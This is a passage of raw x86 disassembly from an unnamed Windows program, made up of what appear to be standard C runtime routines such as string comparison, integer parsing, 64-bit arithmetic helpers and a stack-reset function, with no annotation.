  426c76:	mov    DWORD PTR [ebp-0x2c],0x1
  426c7d:	cmp    DWORD PTR [ebp-0x2c],edi
  426c80:	je     0x426c9c
  426c82:	cmp    ebx,0xffffffff
  426c85:	je     0x426c8b
  426c87:	mov    esi,ebx
  426c89:	jmp    0x426c97
  426c8b:	push   DWORD PTR [ebp+0x10]
  426c8e:	call   0x423f60
  426c93:	pop    ecx
  426c94:	mov    esi,eax
  426c96:	inc    esi
  426c97:	mov    DWORD PTR [ebp-0x44],esi
  426c9a:	jmp    0x426c9f
  426c9c:	mov    esi,DWORD PTR [ebp-0x44]
  426c9f:	cmp    DWORD PTR [ebp-0x2c],edi
  426ca2:	jne    0x426cbe
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   ebx
  426ca7:	push   DWORD PTR [ebp+0x10]
  426caa:	push   0x1
  426cac:	push   DWORD PTR [ebp+0x8]
  426caf:	call   DWORD PTR ds:0x428100
  426cb5:	mov    esi,eax
  426cb7:	mov    DWORD PTR [ebp-0x44],esi
  426cba:	cmp    esi,edi
  426cbc:	je     0x426d16
  426cbe:	mov    DWORD PTR [ebp-0x4],edi
  426cc1:	lea    eax,[esi+esi*1]
  426cc4:	add    eax,0x3
  426cc7:	and    eax,0xfffffffc
  426cca:	call   0x4239a0
  426ccf:	mov    DWORD PTR [ebp-0x18],esp
  426cd2:	mov    ebx,esp
  426cd4:	mov    DWORD PTR [ebp-0x48],ebx
  426cd7:	lea    eax,[esi+esi*1]
  426cda:	push   eax
  426cdb:	push   edi
  426cdc:	push   ebx
  426cdd:	call   0x426250
  426ce2:	add    esp,0xc
  426ce5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426ce9:	jmp    0x426d02
  426ceb:	xor    eax,eax
  426ced:	inc    eax
  426cee:	ret    
  426cef:	mov    esp,DWORD PTR [ebp-0x18]
  426cf2:	call   0x426de5
  426cf7:	xor    edi,edi
  426cf9:	xor    ebx,ebx
  426cfb:	or     DWORD PTR [ebp-0x4],0xffffffff
  426cff:	mov    esi,DWORD PTR [ebp-0x44]
  426d02:	cmp    ebx,edi
  426d04:	jne    0x426d24
  426d06:	push   esi
  426d07:	push   0x2
  426d09:	call   0x424a68
  426d0e:	pop    ecx
  426d0f:	pop    ecx
  426d10:	mov    ebx,eax
  426d12:	cmp    ebx,edi
  426d14:	jne    0x426d1d
  426d16:	xor    eax,eax
  426d18:	jmp    0x426dd1
  426d1d:	mov    DWORD PTR [ebp-0x24],0x1
  426d24:	push   esi
  426d25:	push   ebx
  426d26:	push   DWORD PTR [ebp-0x28]
  426d29:	push   DWORD PTR [ebp+0x10]
  426d2c:	push   0x1
  426d2e:	push   DWORD PTR [ebp+0x8]
  426d31:	call   DWORD PTR ds:0x428100
  426d37:	test   eax,eax
  426d39:	je     0x426dc2
  426d3f:	cmp    DWORD PTR [ebp+0x18],edi
  426d42:	je     0x426d64
  426d44:	push   edi
  426d45:	push   edi
  426d46:	push   DWORD PTR [ebp+0x1c]
  426d49:	push   DWORD PTR [ebp+0x18]
  426d4c:	push   esi
  426d4d:	push   ebx
  426d4e:	push   edi
  426d4f:	push   DWORD PTR [ebp+0xc]
  426d52:	call   DWORD PTR ds:0x428090
  426d58:	test   eax,eax
  426d5a:	je     0x426dc2
  426d5c:	mov    eax,DWORD PTR [ebp+0x18]
  426d5f:	mov    DWORD PTR [ebp-0x20],eax
  426d62:	jmp    0x426dc2
  426d64:	cmp    DWORD PTR [ebp-0x2c],edi
  426d67:	jne    0x426d7f
  426d69:	push   edi
  426d6a:	push   edi
  426d6b:	push   edi
  426d6c:	push   edi
  426d6d:	push   esi
  426d6e:	push   ebx
  426d6f:	push   edi
  426d70:	push   DWORD PTR [ebp+0xc]
  426d73:	call   DWORD PTR ds:0x428090
  426d79:	mov    esi,eax
  426d7b:	cmp    esi,edi
  426d7d:	je     0x426dc2
  426d7f:	push   esi
  426d80:	push   0x1
  426d82:	call   0x424a68
  426d87:	pop    ecx
  426d88:	pop    ecx
  426d89:	mov    DWORD PTR [ebp-0x20],eax
  426d8c:	cmp    eax,edi
  426d8e:	je     0x426dc2
  426d90:	push   edi
  426d91:	push   edi
  426d92:	push   esi
  426d93:	push   eax
  426d94:	push   esi
  426d95:	push   ebx
  426d96:	push   edi
  426d97:	push   DWORD PTR [ebp+0xc]
  426d9a:	call   DWORD PTR ds:0x428090
  426da0:	cmp    eax,edi
  426da2:	jne    0x426db2
  426da4:	push   DWORD PTR [ebp-0x20]
  426da7:	call   0x42455a
  426dac:	pop    ecx
  426dad:	mov    DWORD PTR [ebp-0x20],edi
  426db0:	jmp    0x426dc2
  426db2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426db6:	je     0x426dc2
  426db8:	mov    ecx,DWORD PTR [ebp+0x14]
  426dbb:	mov    DWORD PTR [ecx],eax
  426dbd:	jmp    0x426dc2
  426dbf:	mov    ebx,DWORD PTR [ebp-0x48]
  426dc2:	cmp    DWORD PTR [ebp-0x24],edi
  426dc5:	je     0x426dce
  426dc7:	push   ebx
  426dc8:	call   0x42455a
  426dcd:	pop    ecx
  426dce:	mov    eax,DWORD PTR [ebp-0x20]
  426dd1:	lea    esp,[ebp-0x54]
  426dd4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426dd7:	xor    ecx,DWORD PTR [ebp+0x4]
  426dda:	call   0x42401c
  426ddf:	call   0x42398b
  426de4:	ret    
  426de5:	push   ebp
  426de6:	mov    ebp,esp
  426de8:	sub    esp,0x48
  426deb:	push   ebx
  426dec:	push   esi
  426ded:	push   edi
  426dee:	push   0x4
  426df0:	pop    eax
  426df1:	call   0x4239a0
  426df6:	mov    ebx,esp
  426df8:	push   0x1c
  426dfa:	lea    eax,[ebp-0x24]
  426dfd:	push   eax
  426dfe:	push   ebx
  426dff:	call   DWORD PTR ds:0x428024
  426e05:	test   eax,eax
  426e07:	je     0x426e7a
  426e09:	mov    edi,DWORD PTR [ebp-0x20]
  426e0c:	lea    eax,[ebp-0x48]
  426e0f:	push   eax
  426e10:	call   DWORD PTR ds:0x428038
  426e16:	mov    eax,DWORD PTR [ebp-0x44]
  426e19:	lea    esi,[eax-0x1]
  426e1c:	not    esi
  426e1e:	and    esi,ebx
  426e20:	sub    esi,eax
  426e22:	mov    DWORD PTR [ebp-0x4],eax
  426e25:	mov    eax,ds:0x465d04
  426e2a:	mov    ecx,eax
  426e2c:	dec    ecx
  426e2d:	neg    ecx
  426e2f:	sbb    ecx,ecx
  426e31:	and    ecx,0xffff1000
  426e37:	add    ecx,0x11000
  426e3d:	add    ecx,edi
  426e3f:	cmp    esi,ecx
  426e41:	jb     0x426e7a
  426e43:	cmp    eax,0x1
  426e46:	je     0x426e92
  426e48:	mov    ebx,edi
  426e4a:	mov    edi,0x1000
  426e4f:	push   0x1c
  426e51:	lea    eax,[ebp-0x24]
  426e54:	push   eax
  426e55:	push   ebx
  426e56:	call   DWORD PTR ds:0x428024
  426e5c:	test   eax,eax
  426e5e:	je     0x426e7a
  426e60:	add    ebx,DWORD PTR [ebp-0x18]
  426e63:	test   DWORD PTR [ebp-0x14],edi
  426e66:	je     0x426e4f
  426e68:	test   BYTE PTR [ebp-0xf],0x1
  426e6c:	mov    ebx,DWORD PTR [ebp-0x24]
  426e6f:	je     0x426e76
  426e71:	xor    eax,eax
  426e73:	inc    eax
  426e74:	jmp    0x426eae
  426e76:	cmp    esi,ebx
  426e78:	jae    0x426e7e
  426e7a:	xor    eax,eax
  426e7c:	jmp    0x426eae
  426e7e:	push   0x4
  426e80:	push   edi
  426e81:	push   DWORD PTR [ebp-0x4]
  426e84:	push   ebx
  426e85:	call   DWORD PTR ds:0x4280e4
  426e8b:	mov    eax,ds:0x465d04
  426e90:	jmp    0x426e94
  426e92:	mov    ebx,esi
  426e94:	dec    eax
  426e95:	neg    eax
  426e97:	sbb    eax,eax
  426e99:	and    eax,0x103
  426e9e:	lea    ecx,[ebp-0x8]
  426ea1:	push   ecx
  426ea2:	inc    eax
  426ea3:	push   eax
  426ea4:	push   DWORD PTR [ebp-0x4]
  426ea7:	push   ebx
  426ea8:	call   DWORD PTR ds:0x428054
  426eae:	lea    esp,[ebp-0x54]
  426eb1:	pop    edi
  426eb2:	pop    esi
  426eb3:	pop    ebx
  426eb4:	leave  
  426eb5:	ret    
  426eb6:	int3   
  426eb7:	int3   
  426eb8:	int3   
  426eb9:	int3   
  426eba:	int3   
  426ebb:	int3   
  426ebc:	int3   
  426ebd:	int3   
  426ebe:	int3   
  426ebf:	int3   
  426ec0:	push   ebp
  426ec1:	mov    ebp,esp
  426ec3:	push   edi
  426ec4:	push   esi
  426ec5:	push   ebx
  426ec6:	mov    esi,DWORD PTR [ebp+0xc]
  426ec9:	mov    edi,DWORD PTR [ebp+0x8]
  426ecc:	mov    al,0xff
  426ece:	mov    edi,edi
  426ed0:	or     al,al
  426ed2:	je     0x426f06
  426ed4:	mov    al,BYTE PTR [esi]
  426ed6:	add    esi,0x1
  426ed9:	mov    ah,BYTE PTR [edi]
  426edb:	add    edi,0x1
  426ede:	cmp    ah,al
  426ee0:	je     0x426ed0
  426ee2:	sub    al,0x41
  426ee4:	cmp    al,0x1a
  426ee6:	sbb    cl,cl
  426ee8:	and    cl,0x20
  426eeb:	add    al,cl
  426eed:	add    al,0x41
  426eef:	xchg   al,ah
  426ef1:	sub    al,0x41
  426ef3:	cmp    al,0x1a
  426ef5:	sbb    cl,cl
  426ef7:	and    cl,0x20
  426efa:	add    al,cl
  426efc:	add    al,0x41
  426efe:	cmp    al,ah
  426f00:	je     0x426ed0
  426f02:	sbb    al,al
  426f04:	sbb    al,0xff
  426f06:	movsx  eax,al
  426f09:	pop    ebx
  426f0a:	pop    esi
  426f0b:	pop    edi
  426f0c:	leave  
  426f0d:	ret    
  426f0e:	push   esi
  426f0f:	push   edi
  426f10:	call   0x423803
  426f15:	mov    edi,DWORD PTR [eax+0x64]
  426f18:	cmp    edi,DWORD PTR ds:0x4657bc
  426f1e:	je     0x426f27
  426f20:	call   0x424caf
  426f25:	mov    edi,eax
  426f27:	mov    esi,DWORD PTR [esp+0xc]
  426f2b:	cmp    DWORD PTR [edi+0x28],0x1
  426f2f:	movzx  eax,BYTE PTR [esi]
  426f32:	jle    0x426f42
  426f34:	push   0x8
  426f36:	push   eax
  426f37:	push   edi
  426f38:	call   0x426f96
  426f3d:	add    esp,0xc
  426f40:	jmp    0x426f4c
  426f42:	mov    ecx,DWORD PTR [edi+0x48]
  426f45:	movzx  eax,BYTE PTR [ecx+eax*2]
  426f49:	and    eax,0x8
  426f4c:	test   eax,eax
  426f4e:	je     0x426f53
  426f50:	inc    esi
  426f51:	jmp    0x426f2b
  426f53:	movzx  ecx,BYTE PTR [esi]
  426f56:	inc    esi
  426f57:	cmp    ecx,0x2d
  426f5a:	mov    edx,ecx
  426f5c:	je     0x426f63
  426f5e:	cmp    ecx,0x2b
  426f61:	jne    0x426f67
  426f63:	movzx  ecx,BYTE PTR [esi]
  426f66:	inc    esi
  426f67:	xor    eax,eax
  426f69:	cmp    ecx,0x30
  426f6c:	jl     0x426f78
  426f6e:	cmp    ecx,0x39
  426f71:	jg     0x426f78
  426f73:	sub    ecx,0x30
  426f76:	jmp    0x426f7b
  426f78:	or     ecx,0xffffffff
  426f7b:	cmp    ecx,0xffffffff
  426f7e:	je     0x426f8c
  426f80:	lea    eax,[eax+eax*4]
  426f83:	lea    eax,[ecx+eax*2]
  426f86:	movzx  ecx,BYTE PTR [esi]
  426f89:	inc    esi
  426f8a:	jmp    0x426f69
  426f8c:	cmp    edx,0x2d
  426f8f:	pop    edi
  426f90:	pop    esi
  426f91:	jne    0x426f95
  426f93:	neg    eax
  426f95:	ret    
  426f96:	push   ebp
  426f97:	mov    ebp,esp
  426f99:	push   ecx
  426f9a:	mov    eax,DWORD PTR [ebp+0xc]
  426f9d:	lea    ecx,[eax+0x1]
  426fa0:	cmp    ecx,0x100
  426fa6:	mov    ecx,DWORD PTR [ebp+0x8]
  426fa9:	ja     0x426fb4
  426fab:	mov    ecx,DWORD PTR [ecx+0x48]
  426fae:	movzx  eax,WORD PTR [ecx+eax*2]
  426fb2:	jmp    0x427008
  426fb4:	push   esi
  426fb5:	mov    edx,eax
  426fb7:	sar    edx,0x8
  426fba:	push   edi
  426fbb:	mov    edi,DWORD PTR [ecx+0x48]
  426fbe:	movzx  esi,dl
  426fc1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426fc6:	pop    edi
  426fc7:	pop    esi
  426fc8:	je     0x426fd9
  426fca:	and    BYTE PTR [ebp-0x2],0x0
  426fce:	push   0x2
  426fd0:	mov    BYTE PTR [ebp-0x3],al
  426fd3:	mov    BYTE PTR [ebp-0x4],dl
  426fd6:	pop    eax
  426fd7:	jmp    0x426fe3
  426fd9:	and    BYTE PTR [ebp-0x3],0x0
  426fdd:	mov    BYTE PTR [ebp-0x4],al
  426fe0:	xor    eax,eax
  426fe2:	inc    eax
  426fe3:	push   0x1
  426fe5:	push   DWORD PTR [ecx+0x14]
  426fe8:	push   DWORD PTR [ecx+0x4]
  426feb:	lea    ecx,[ebp+0xe]
  426fee:	push   ecx
  426fef:	push   eax
  426ff0:	lea    eax,[ebp-0x4]
  426ff3:	push   eax
  426ff4:	push   0x1
  426ff6:	call   0x426078
  426ffb:	add    esp,0x1c
  426ffe:	test   eax,eax
  427000:	jne    0x427004
  427002:	leave  
  427003:	ret    
  427004:	movzx  eax,WORD PTR [ebp+0xe]
  427008:	and    eax,DWORD PTR [ebp+0x10]
  42700b:	leave  
  42700c:	ret    
  42700d:	int3   
  42700e:	int3   
  42700f:	int3   
  427010:	mov    eax,DWORD PTR [esp+0x8]
  427014:	mov    ecx,DWORD PTR [esp+0x10]
  427018:	or     ecx,eax
  42701a:	mov    ecx,DWORD PTR [esp+0xc]
  42701e:	jne    0x427029
  427020:	mov    eax,DWORD PTR [esp+0x4]
  427024:	mul    ecx
  427026:	ret    0x10
  427029:	push   ebx
  42702a:	mul    ecx
  42702c:	mov    ebx,eax
  42702e:	mov    eax,DWORD PTR [esp+0x8]
  427032:	mul    DWORD PTR [esp+0x14]
  427036:	add    ebx,eax
  427038:	mov    eax,DWORD PTR [esp+0x8]
  42703c:	mul    ecx
  42703e:	add    edx,ebx
  427040:	pop    ebx
  427041:	ret    0x10
  427044:	int3   
  427045:	int3   
  427046:	int3   
  427047:	int3   
  427048:	int3   
  427049:	int3   
  42704a:	int3   
  42704b:	int3   
  42704c:	int3   
  42704d:	int3   
  42704e:	int3   
  42704f:	int3   
  427050:	push   ebp
  427051:	mov    ebp,esp
  427053:	push   edi
  427054:	push   esi
  427055:	push   ebx
  427056:	mov    ecx,DWORD PTR [ebp+0x10]
  427059:	or     ecx,ecx
  42705b:	je     0x4270aa
  42705d:	mov    esi,DWORD PTR [ebp+0x8]
  427060:	mov    edi,DWORD PTR [ebp+0xc]
  427063:	mov    bh,0x41
  427065:	mov    bl,0x5a
  427067:	mov    dh,0x20
  427069:	lea    ecx,[ecx+0x0]
  42706c:	mov    ah,BYTE PTR [esi]
  42706e:	or     ah,ah
  427070:	mov    al,BYTE PTR [edi]
  427072:	je     0x42709b
  427074:	or     al,al
  427076:	je     0x42709b
  427078:	add    esi,0x1
  42707b:	add    edi,0x1
  42707e:	cmp    ah,bh
  427080:	jb     0x427088
  427082:	cmp    ah,bl
  427084:	ja     0x427088
  427086:	add    ah,dh
  427088:	cmp    al,bh
  42708a:	jb     0x427092
  42708c:	cmp    al,bl
  42708e:	ja     0x427092
  427090:	add    al,dh
  427092:	cmp    ah,al
  427094:	jne    0x4270a1
  427096:	sub    ecx,0x1
  427099:	jne    0x42706c
  42709b:	xor    ecx,ecx
  42709d:	cmp    ah,al
  42709f:	je     0x4270aa
  4270a1:	mov    ecx,0xffffffff
  4270a6:	jb     0x4270aa
  4270a8:	neg    ecx
  4270aa:	mov    eax,ecx
  4270ac:	pop    ebx
  4270ad:	pop    esi
  4270ae:	pop    edi
  4270af:	leave  
  4270b0:	ret    
  4270b1:	int3   
  4270b2:	int3   
  4270b3:	int3   
  4270b4:	int3   
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	push   esi
  4270c1:	mov    eax,DWORD PTR [esp+0x14]
  4270c5:	or     eax,eax
  4270c7:	jne    0x4270f1
  4270c9:	mov    ecx,DWORD PTR [esp+0x10]
  4270cd:	mov    eax,DWORD PTR [esp+0xc]
  4270d1:	xor    edx,edx
  4270d3:	div    ecx
  4270d5:	mov    ebx,eax
  4270d7:	mov    eax,DWORD PTR [esp+0x8]
  4270db:	div    ecx
  4270dd:	mov    esi,eax
  4270df:	mov    eax,ebx
  4270e1:	mul    DWORD PTR [esp+0x10]
  4270e5:	mov    ecx,eax
  4270e7:	mov    eax,esi
  4270e9:	mul    DWORD PTR [esp+0x10]
  4270ed:	add    edx,ecx
  4270ef:	jmp    0x427138
  4270f1:	mov    ecx,eax
  4270f3:	mov    ebx,DWORD PTR [esp+0x10]
  4270f7:	mov    edx,DWORD PTR [esp+0xc]
  4270fb:	mov    eax,DWORD PTR [esp+0x8]
  4270ff:	shr    ecx,1
  427101:	rcr    ebx,1
  427103:	shr    edx,1
  427105:	rcr    eax,1
  427107:	or     ecx,ecx
  427109:	jne    0x4270ff
  42710b:	div    ebx
  42710d:	mov    esi,eax
  42710f:	mul    DWORD PTR [esp+0x14]
  427113:	mov    ecx,eax
  427115:	mov    eax,DWORD PTR [esp+0x10]
  427119:	mul    esi
  42711b:	add    edx,ecx
  42711d:	jb     0x42712d
  42711f:	cmp    edx,DWORD PTR [esp+0xc]
  427123:	ja     0x42712d
  427125:	jb     0x427136
  427127:	cmp    eax,DWORD PTR [esp+0x8]
  42712b:	jbe    0x427136
  42712d:	dec    esi
  42712e:	sub    eax,DWORD PTR [esp+0x10]
  427132:	sbb    edx,DWORD PTR [esp+0x14]
  427136:	xor    ebx,ebx
  427138:	sub    eax,DWORD PTR [esp+0x8]
  42713c:	sbb    edx,DWORD PTR [esp+0xc]
  427140:	neg    edx
  427142:	neg    eax
  427144:	sbb    edx,0x0
  427147:	mov    ecx,edx
  427149:	mov    edx,ebx
  42714b:	mov    ebx,ecx
  42714d:	mov    ecx,eax
  42714f:	mov    eax,esi
  427151:	pop    esi
  427152:	ret    0x10
  427155:	int3   
  427156:	int3   
  427157:	int3   
  427158:	int3   
  427159:	int3   
  42715a:	int3   
  42715b:	int3   
  42715c:	int3   
  42715d:	int3   
  42715e:	int3   
  42715f:	int3   
  427160:	lea    eax,[edx-0x1]
  427163:	pop    ebx
  427164:	ret    
  427165:	lea    esp,[esp+0x0]
  42716c:	lea    esp,[esp+0x0]
  427170:	xor    eax,eax
  427172:	mov    al,BYTE PTR [esp+0x8]
  427176:	push   ebx
  427177:	mov    ebx,eax
  427179:	shl    eax,0x8
  42717c:	mov    edx,DWORD PTR [esp+0x8]
  427180:	test   edx,0x3
  427186:	je     0x42719d
  427188:	mov    cl,BYTE PTR [edx]
  42718a:	add    edx,0x1
  42718d:	cmp    cl,bl
  42718f:	je     0x427160
  427191:	test   cl,cl
  427193:	je     0x4271e6
  427195:	test   edx,0x3
  42719b:	jne    0x427188
  42719d:	or     ebx,eax
  42719f:	push   edi
  4271a0:	mov    eax,ebx
  4271a2:	shl    ebx,0x10
  4271a5:	push   esi
  4271a6:	or     ebx,eax
  4271a8:	mov    ecx,DWORD PTR [edx]
  4271aa:	mov    edi,0x7efefeff
  4271af:	mov    eax,ecx
  4271b1:	mov    esi,edi
  4271b3:	xor    ecx,ebx
  4271b5:	add    esi,eax
  4271b7:	add    edi,ecx
  4271b9:	xor    ecx,0xffffffff
  4271bc:	xor    eax,0xffffffff
  4271bf:	xor    ecx,edi
  4271c1:	xor    eax,esi
  4271c3:	add    edx,0x4
  4271c6:	and    ecx,0x81010100
  4271cc:	jne    0x4271ea
  4271ce:	and    eax,0x81010100
  4271d3:	je     0x4271a8
  4271d5:	and    eax,0x1010100
  4271da:	jne    0x4271e4
  4271dc:	and    esi,0x80000000
  4271e2:	jne    0x4271a8
  4271e4:	pop    esi
  4271e5:	pop    edi
  4271e6:	pop    ebx
  4271e7:	xor    eax,eax
  4271e9:	ret    
  4271ea:	mov    eax,DWORD PTR [edx-0x4]
  4271ed:	cmp    al,bl
  4271ef:	je     0x427227
  4271f1:	test   al,al
  4271f3:	je     0x4271e4
  4271f5:	cmp    ah,bl
  4271f7:	je     0x427220
  4271f9:	test   ah,ah
  4271fb:	je     0x4271e4
  4271fd:	shr    eax,0x10
  427200:	cmp    al,bl
  427202:	je     0x427219
  427204:	test   al,al
  427206:	je     0x4271e4
  427208:	cmp    ah,bl
  42720a:	je     0x427212
  42720c:	test   ah,ah
  42720e:	je     0x4271e4
  427210:	jmp    0x4271a8
  427212:	pop    esi
  427213:	pop    edi
  427214:	lea    eax,[edx-0x1]
  427217:	pop    ebx
  427218:	ret    
  427219:	lea    eax,[edx-0x2]
  42721c:	pop    esi
  42721d:	pop    edi
  42721e:	pop    ebx
  42721f:	ret    
  427220:	lea    eax,[edx-0x3]
  427223:	pop    esi
  427224:	pop    edi
  427225:	pop    ebx
  427226:	ret    
  427227:	lea    eax,[edx-0x4]
  42722a:	pop    esi
  42722b:	pop    edi
  42722c:	pop    ebx
  42722d:	ret    
  42722e:	jmp    DWORD PTR ds:0x428058
